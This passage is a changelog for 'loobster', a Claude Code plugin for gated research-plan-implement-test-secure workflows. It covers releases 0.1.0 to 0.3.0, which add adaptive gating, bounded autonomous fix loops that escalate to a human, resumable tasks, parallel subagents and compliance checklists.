- **New "Running unattended" section** in `/run`: clarifies that the plugin defines behavior but the *turns* come from a driver — interactive Claude Code (hands-off in-session), or `/loop`/scheduled agent/Agent SDK for truly unattended runs.
- **README workflow diagram** is now a rendered Mermaid flowchart (replacing the ASCII art), showing the gated and autonomous-fix-loop bands.

## 0.3.0 — Autonomous loops & dynamic workflows

- **Adaptive gating (Phase 0):** `/run` now right-sizes each task (trivial / standard / sensitive) and applies a gate policy per tier. New `--auto` (let trivial tasks auto-advance early phases) and `--manual` (force all gates) flags. Sensitive tasks never auto-advance; the Secure phase always runs for every tier.
- **Bounded autonomous convergence loop:** the Implement→Test→Secure fix loop self-drives up to 3 iterations, then escalates to a human — never silently commits past unresolved FAILs.
- **Resumable workflows:** real Claude Code Tasks status lifecycle across Implement/Test/Secure, plus a new `/resume` command that rebuilds state from `TaskList` after a crash or new session.
- **Tier-1 parallelism:** independent sub-issues (disjoint files, no blocking edge) are implemented concurrently in isolated worktrees via subagents; degrades to serial when subagents aren't available.
- **Built-in autonomous implementation loop:** removed the external `/ralph-loop` dependency in favor of a first-party `--autonomous` flag that implements sub-issues in the built-in bounded loop (iterate implement→test until acceptance criteria pass, cap 3, then escalate) — no external plugin required.
- **Native token discipline (Option A):** new `commands/token-discipline.md` — subagent isolation, artifact compaction, cache-stable prefixes, terse output. Always on, zero-dependency, portable.
- **Optional headroom compression (Option D):** opt-in, default-OFF `PostToolUse` hook (`hooks/hooks.json` + `bin/headroom-compress.py`) that compresses large tool outputs via a locally-installed [headroom](https://github.com/chopratejas/headroom) when `LOOBSTER_HEADROOM=1`. Graceful passthrough otherwise. Tests in `tests/test-headroom-hook.sh`. Healthcare PHI-data-path caveat documented in the README and `compliance/org-controls-audit.md`.
- Tier-2 deterministic Workflow harness (subagents + Workflow-tool orchestration) is designed and tracked as a follow-up epic in `plans/autonomous-loops/`.

## 0.2.0 — Plugin pivot

- Repackaged as a Claude Code plugin (was a VS Code / Cursor extension)
- Installable via `/plugin marketplace add NilsWidal/loobster`
- Seven slash commands: `/run`, `/research-codebase`, `/make-proposals`, `/make-plan`, `/implement`, `/review-code`, `/secure`
- Cross-references inside commands use `${CLAUDE_PLUGIN_ROOT}` for plugin-local paths, with `.claude/compliance/*.md` workspace overrides supported by `/secure`
- Extension scaffold (`src/`, `dist/`, `package.json`, VSIX, sidebar webview) removed; full history preserved at the `pre-plugin-pivot` git tag

## 0.1.0 — Initial Release (VS Code / Cursor extension, archived)

- Full RePPITS workflow: Research, Propose, Plan, Implement, Test, Secure
- Visual sidebar with phase stepper, gate prompts, and real-time log
- HIPAA, SOC2, and HITRUST compliance checklists with pass/warn/fail reporting
- Sound and system notifications at workflow gates
- Optional Linear integration (auto-detected via MCP, falls back to local .md files)
- Scaffoldable command templates (`RePPIT: Initialize Project Templates`)
- Standalone `/secure` command for ad-hoc security checks
- Works in VS Code and Cursor
